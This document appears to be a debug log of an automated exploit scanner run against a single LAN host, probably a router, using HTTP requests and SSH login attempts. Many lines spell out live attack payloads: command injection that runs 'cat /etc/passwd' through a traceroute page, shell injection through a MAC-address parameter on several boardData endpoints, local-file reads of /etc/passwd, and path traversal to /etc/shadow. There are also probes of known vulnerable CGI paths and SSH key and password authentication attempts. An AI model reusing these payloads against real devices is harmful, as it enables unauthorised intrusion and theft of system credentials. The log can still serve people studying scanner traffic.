+2017-04-10 13:15:20,056 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET / HTTP/1.1" 200 2401
+2017-04-10 13:15:20,060 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,067 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "POST /debug.cgi HTTP/1.1" 404 286
+2017-04-10 13:15:20,070 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,070 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "POST /apply.cgi HTTP/1.1" 404 286
+2017-04-10 13:15:20,072 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,074 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /view/systemConfig/systemTool/traceRoute/traceroute.php?text_target=127.0.0.1&text_ageout=2&text_minttl=1&text_maxttl=1%7Ccat+/etc/passwd; HTTP/1.1" 404 331
+2017-04-10 13:15:20,084 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "POST /cgi-bin/cgiSrv.cgi HTTP/1.1" 404 295
+2017-04-10 13:15:20,087 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,087 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "POST /web_shell_cmd.gch HTTP/1.1" 404 294
+2017-04-10 13:15:20,089 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,096 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,104 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /cgi-bin/authorize.asp HTTP/1.1" 404 298
+2017-04-10 13:15:20,106 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,108 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET / HTTP/1.1" 200 2401
+2017-04-10 13:15:20,110 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,116 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "POST /UD/act?1 HTTP/1.1" 404 283
+2017-04-10 13:15:20,118 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /globe HTTP/1.1" 404 282
+2017-04-10 13:15:20,120 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,121 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,124 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /js/Multi_Language.js HTTP/1.1" 404 297
+2017-04-10 13:15:20,125 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,135 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /SaveCfgFile.cgi HTTP/1.1" 404 292
+2017-04-10 13:15:20,137 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,146 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /cgi-bin/export-cgi/images/?category=config&arg0=startup-config.conf HTTP/1.1" 404 303
+2017-04-10 13:15:20,146 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /login.stm HTTP/1.1" 404 286
+2017-04-10 13:15:20,149 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,150 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,154 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "POST /login.cgi.php HTTP/1.1" 404 290
+2017-04-10 13:15:20,155 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,163 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /login.stm HTTP/1.1" 404 286
+2017-04-10 13:15:20,166 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,167 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /login.stm HTTP/1.1" 404 286
+2017-04-10 13:15:20,169 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /cgi-bin/webproc?getpage=/etc/passwd&var:page=deviceinfo HTTP/1.1" 404 292
+2017-04-10 13:15:20,170 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,172 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,203 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /login.cgi HTTP/1.1" 404 286
+2017-04-10 13:15:20,207 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,210 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "POST /ping.cgi HTTP/1.1" 404 285
+2017-04-10 13:15:20,212 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /boardData102.php?writeData=true&reginfo=0&macAddress=%20001122334455%20-c%200%20;echo%20lf5y9UIPgwRV8MDPqYQ9guKeOjYu7fH7;%20echo%20 HTTP/1.1" 404 293
+2017-04-10 13:15:20,213 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,214 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,224 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "POST /login.cgi HTTP/1.1" 404 286
+2017-04-10 13:15:20,225 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,235 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /boardData103.php?writeData=true&reginfo=0&macAddress=%20001122334455%20-c%200%20;echo%20lf5y9UIPgwRV8MDPqYQ9guKeOjYu7fH7;%20echo%20 HTTP/1.1" 404 293
+2017-04-10 13:15:20,236 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,237 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /airview.uavr HTTP/1.1" 404 289
+2017-04-10 13:15:20,239 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,248 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /boardDataNA.php?writeData=true&reginfo=0&macAddress=%20001122334455%20-c%200%20;echo%20lf5y9UIPgwRV8MDPqYQ9guKeOjYu7fH7;%20echo%20 HTTP/1.1" 404 292
+2017-04-10 13:15:20,250 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,251 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "POST /login.cgi HTTP/1.1" 404 286
+2017-04-10 13:15:20,252 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET / HTTP/1.1" 200 2401
+2017-04-10 13:15:20,253 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,256 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,269 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "HEAD / HTTP/1.1" 200 0
+2017-04-10 13:15:20,270 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,271 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "POST /login_handler.php HTTP/1.1" 404 294
+2017-04-10 13:15:20,271 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /boardDataWW.php?writeData=true&reginfo=0&macAddress=%20001122334455%20-c%200%20;echo%20lf5y9UIPgwRV8MDPqYQ9guKeOjYu7fH7;%20echo%20 HTTP/1.1" 404 292
+2017-04-10 13:15:20,274 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,274 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,282 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /cgi-bin/webproc?getpage=/etc/passwd&errorpage=html/main.html&var:language=en_us&var:language=en_us&var:page=BAS_bpa HTTP/1.1" 404 292
+2017-04-10 13:15:20,284 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,290 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /boardDataJP.php?writeData=true&reginfo=0&macAddress=%20001122334455%20-c%200%20;echo%20lf5y9UIPgwRV8MDPqYQ9guKeOjYu7fH7;%20echo%20 HTTP/1.1" 404 292
+2017-04-10 13:15:20,290 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /cgi-bin/webproc?getpage=/etc/passwd&var:language=en_us&var:language=en_us&var:menu=advanced&var:page=basic_home HTTP/1.1" 404 292
+2017-04-10 13:15:20,299 DEBUG paramiko.transport       starting thread (client mode): 0x4526f190L
+2017-04-10 13:15:20,299 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.0.0
+2017-04-10 13:15:20,320 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET / HTTP/1.1" 200 2401
+2017-04-10 13:15:20,349 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,360 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "POST /UD/?5 HTTP/1.1" 404 280
+2017-04-10 13:15:20,362 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,371 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /html/password.html HTTP/1.1" 404 295
+2017-04-10 13:15:20,373 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,381 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /api/wlan/security-settings HTTP/1.1" 404 303
+2017-04-10 13:15:20,384 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,398 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET / HTTP/1.1" 200 2401
+2017-04-10 13:15:20,400 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,412 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "POST /goform/enhAuthHandler HTTP/1.1" 404 298
+2017-04-10 13:15:20,417 DEBUG paramiko.transport       starting thread (client mode): 0x4529ffd0L
+2017-04-10 13:15:20,417 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.0.0
+2017-04-10 13:15:20,563 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_6.7p1 Debian-5
+2017-04-10 13:15:20,563 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_6.7p1)
+2017-04-10 13:15:20,585 DEBUG paramiko.transport       kex algos:[u'curve25519-sha256@libssh.org', u'ecdh-sha2-nistp256', u'ecdh-sha2-nistp384', u'ecdh-sha2-nistp521', u'diffie-hellman-group-exchange-sha256', u'diffie-hellman-group14-sha1'] server key:[u'ssh-rsa', u'ssh-dss', u'ecdsa-sha2-nistp256', u'ssh-ed25519'] client encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] server encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] client mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] server mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] client compress:[u'none', u'zlib@openssh.com'] server compress:[u'none', u'zlib@openssh.com'] client lang:[u''] server lang:[u''] kex follows?False
+2017-04-10 13:15:20,585 DEBUG paramiko.transport       Kex agreed: diffie-hellman-group14-sha1
+2017-04-10 13:15:20,585 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2017-04-10 13:15:20,585 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2017-04-10 13:15:20,585 DEBUG paramiko.transport       Compression agreed: none
+2017-04-10 13:15:20,603 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_6.7p1 Debian-5
+2017-04-10 13:15:20,603 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_6.7p1)
+2017-04-10 13:15:20,650 DEBUG paramiko.transport       kex algos:[u'curve25519-sha256@libssh.org', u'ecdh-sha2-nistp256', u'ecdh-sha2-nistp384', u'ecdh-sha2-nistp521', u'diffie-hellman-group-exchange-sha256', u'diffie-hellman-group14-sha1'] server key:[u'ssh-rsa', u'ssh-dss', u'ecdsa-sha2-nistp256', u'ssh-ed25519'] client encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] server encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] client mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] server mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] client compress:[u'none', u'zlib@openssh.com'] server compress:[u'none', u'zlib@openssh.com'] client lang:[u''] server lang:[u''] kex follows?False
+2017-04-10 13:15:20,651 DEBUG paramiko.transport       Kex agreed: diffie-hellman-group14-sha1
+2017-04-10 13:15:20,651 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2017-04-10 13:15:20,651 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2017-04-10 13:15:20,651 DEBUG paramiko.transport       Compression agreed: none
+2017-04-10 13:15:20,701 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_6.7p1 Debian-5
+2017-04-10 13:15:20,701 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_6.7p1)
+2017-04-10 13:15:20,730 DEBUG paramiko.transport       kex algos:[u'curve25519-sha256@libssh.org', u'ecdh-sha2-nistp256', u'ecdh-sha2-nistp384', u'ecdh-sha2-nistp521', u'diffie-hellman-group-exchange-sha256', u'diffie-hellman-group14-sha1'] server key:[u'ssh-rsa', u'ssh-dss', u'ecdsa-sha2-nistp256', u'ssh-ed25519'] client encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] server encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] client mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] server mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] client compress:[u'none', u'zlib@openssh.com'] server compress:[u'none', u'zlib@openssh.com'] client lang:[u''] server lang:[u''] kex follows?False
+2017-04-10 13:15:20,730 DEBUG paramiko.transport       Kex agreed: diffie-hellman-group14-sha1
+2017-04-10 13:15:20,730 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2017-04-10 13:15:20,730 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2017-04-10 13:15:20,730 DEBUG paramiko.transport       Compression agreed: none
+2017-04-10 13:15:20,781 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_6.7p1 Debian-5
+2017-04-10 13:15:20,781 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_6.7p1)
+2017-04-10 13:15:20,809 DEBUG paramiko.transport       kex algos:[u'curve25519-sha256@libssh.org', u'ecdh-sha2-nistp256', u'ecdh-sha2-nistp384', u'ecdh-sha2-nistp521', u'diffie-hellman-group-exchange-sha256', u'diffie-hellman-group14-sha1'] server key:[u'ssh-rsa', u'ssh-dss', u'ecdsa-sha2-nistp256', u'ssh-ed25519'] client encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] server encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] client mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] server mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] client compress:[u'none', u'zlib@openssh.com'] server compress:[u'none', u'zlib@openssh.com'] client lang:[u''] server lang:[u''] kex follows?False
+2017-04-10 13:15:20,809 DEBUG paramiko.transport       Kex agreed: diffie-hellman-group14-sha1
+2017-04-10 13:15:20,809 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2017-04-10 13:15:20,809 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2017-04-10 13:15:20,809 DEBUG paramiko.transport       Compression agreed: none
+2017-04-10 13:15:21,537 DEBUG paramiko.transport       kex engine KexGroup14 specified hash_algo <built-in function openssl_sha1>
+2017-04-10 13:15:21,537 DEBUG paramiko.transport       kex engine KexGroup14 specified hash_algo <built-in function openssl_sha1>
+2017-04-10 13:15:21,538 DEBUG paramiko.transport       Switch to new keys ...
+2017-04-10 13:15:21,538 DEBUG paramiko.transport       Switch to new keys ...
+2017-04-10 13:15:21,543 DEBUG paramiko.transport       Adding ssh-rsa host key for 192.168.1.248: 012f78625f62a68a719c5878d8dfac1e
+2017-04-10 13:15:21,548 DEBUG paramiko.transport       userauth is OK
+2017-04-10 13:15:21,571 DEBUG paramiko.transport       kex engine KexGroup14 specified hash_algo <built-in function openssl_sha1>
+2017-04-10 13:15:21,571 DEBUG paramiko.transport       Switch to new keys ...
+2017-04-10 13:15:21,573 DEBUG paramiko.transport       Adding ssh-rsa host key for 192.168.1.248: 012f78625f62a68a719c5878d8dfac1e
+2017-04-10 13:15:21,573 DEBUG paramiko.transport       Trying SSH key 22c8a9c301a01731a543f2704a1c55f6
+2017-04-10 13:15:21,576 DEBUG paramiko.transport       userauth is OK
+2017-04-10 13:15:21,584 DEBUG paramiko.transport       Adding ssh-rsa host key for 192.168.1.248: 012f78625f62a68a719c5878d8dfac1e
+2017-04-10 13:15:21,588 DEBUG paramiko.transport       userauth is OK
+2017-04-10 13:15:21,657 INFO paramiko.transport       Authentication (publickey) failed.
+2017-04-10 13:15:21,657 DEBUG paramiko.transport       kex engine KexGroup14 specified hash_algo <built-in function openssl_sha1>
+2017-04-10 13:15:21,658 DEBUG paramiko.transport       Switch to new keys ...
+2017-04-10 13:15:21,665 DEBUG paramiko.transport       Adding ssh-rsa host key for 192.168.1.248: 012f78625f62a68a719c5878d8dfac1e
+2017-04-10 13:15:21,668 DEBUG paramiko.transport       userauth is OK
+2017-04-10 13:15:21,697 INFO paramiko.transport       Authentication (password) failed.
+2017-04-10 13:15:21,733 DEBUG paramiko.transport       userauth is OK
+2017-04-10 13:15:21,735 DEBUG paramiko.transport       Authentication type (keyboard-interactive) not permitted.
+2017-04-10 13:15:21,735 DEBUG paramiko.transport       Allowed methods: [u'publickey', u'password']
+2017-04-10 13:15:21,757 DEBUG paramiko.transport       EOF in transport thread
+2017-04-10 13:15:21,790 DEBUG paramiko.transport       starting thread (client mode): 0x302d7c90L
+2017-04-10 13:15:21,790 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.0.0
+2017-04-10 13:15:21,835 DEBUG paramiko.transport       EOF in transport thread
+2017-04-10 13:15:21,852 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:21,861 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /password.cgi HTTP/1.1" 404 289
+2017-04-10 13:15:21,863 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:21,869 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /../../../../../../../../../../../../etc/shadow HTTP/1.1" 400 305
+2017-04-10 13:15:21,890 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_6.7p1 Debian-5
+2017-04-10 13:15:21,890 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_6.7p1)
+2017-04-10 13:15:21,897 DEBUG paramiko.transport       kex algos:[u'curve25519-sha256@libssh.org', u'ecdh-sha2-nistp256', u'ecdh-sha2-nistp384', u'ecdh-sha2-nistp521', u'diffie-hellman-group-exchange-sha256', u'diffie-hellman-group14-sha1'] server key:[u'ssh-rsa', u'ssh-dss', u'ecdsa-sha2-nistp256', u'ssh-ed25519'] client encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] server encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] client mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] server mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] client compress:[u'none', u'zlib@openssh.com'] server compress:[u'none', u'zlib@openssh.com'] client lang:[u''] server lang:[u''] kex follows?False
+2017-04-10 13:15:21,897 DEBUG paramiko.transport       Kex agreed: diffie-hellman-group14-sha1
+2017-04-10 13:15:21,897 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2017-04-10 13:15:21,897 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2017-04-10 13:15:21,898 DEBUG paramiko.transport       Compression agreed: none
+2017-04-10 13:15:22,137 DEBUG paramiko.transport       kex engine KexGroup14 specified hash_algo <built-in function openssl_sha1>
+2017-04-10 13:15:22,137 DEBUG paramiko.transport       Switch to new keys ...
+2017-04-10 13:15:22,169 DEBUG paramiko.transport       Adding ssh-rsa host key for 192.168.1.248: 012f78625f62a68a719c5878d8dfac1e
+2017-04-10 13:15:22,169 DEBUG paramiko.transport       Trying SSH key e44d3e11db3f06be3140d8fe038e468b
+2017-04-10 13:15:22,174 DEBUG paramiko.transport       userauth is OK
+2017-04-10 13:15:22,211 INFO paramiko.transport       Authentication (publickey) failed.
+2017-04-10 13:15:22,311 DEBUG paramiko.transport       EOF in transport thread
+2017-04-10 13:15:22,350 DEBUG paramiko.transport       starting thread (client mode): 0x302d7a50L
+2017-04-10 13:15:22,350 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.0.0
+2017-04-10 13:15:22,432 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_6.7p1 Debian-5
+2017-04-10 13:15:22,433 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_6.7p1)
+2017-04-10 13:15:22,440 DEBUG paramiko.transport       kex algos:[u'curve25519-sha256@libssh.org', u'ecdh-sha2-nistp256', u'ecdh-sha2-nistp384', u'ecdh-sha2-nistp521', u'diffie-hellman-group-exchange-sha256', u'diffie-hellman-group14-sha1'] server key:[u'ssh-rsa', u'ssh-dss', u'ecdsa-sha2-nistp256', u'ssh-ed25519'] client encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] server encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] client mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] server mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] client compress:[u'none', u'zlib@openssh.com'] server compress:[u'none', u'zlib@openssh.com'] client lang:[u''] server lang:[u''] kex follows?False
+2017-04-10 13:15:22,441 DEBUG paramiko.transport       Kex agreed: diffie-hellman-group14-sha1
+2017-04-10 13:15:22,441 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2017-04-10 13:15:22,441 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2017-04-10 13:15:22,441 DEBUG paramiko.transport       Compression agreed: none
+2017-04-10 13:15:22,671 DEBUG paramiko.transport       kex engine KexGroup14 specified hash_algo <built-in function openssl_sha1>
+2017-04-10 13:15:22,671 DEBUG paramiko.transport       Switch to new keys ...
+2017-04-10 13:15:22,675 DEBUG paramiko.transport       Adding ssh-rsa host key for 192.168.1.248: 012f78625f62a68a719c5878d8dfac1e
+2017-04-10 13:15:22,675 DEBUG paramiko.transport       Trying SSH key 049bf5dede27105ab88dab79cd17e857
+2017-04-10 13:15:22,858 DEBUG paramiko.transport       userauth is OK
+2017-04-10 13:15:22,889 INFO paramiko.transport       Authentication (publickey) failed.
+2017-04-10 13:15:22,989 DEBUG paramiko.transport       EOF in transport thread
+2017-04-10 13:15:23,008 DEBUG paramiko.transport       starting thread (client mode): 0x4528c3d0L
+2017-04-10 13:15:23,008 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.0.0
+2017-04-10 13:15:23,093 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_6.7p1 Debian-5
+2017-04-10 13:15:23,093 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_6.7p1)
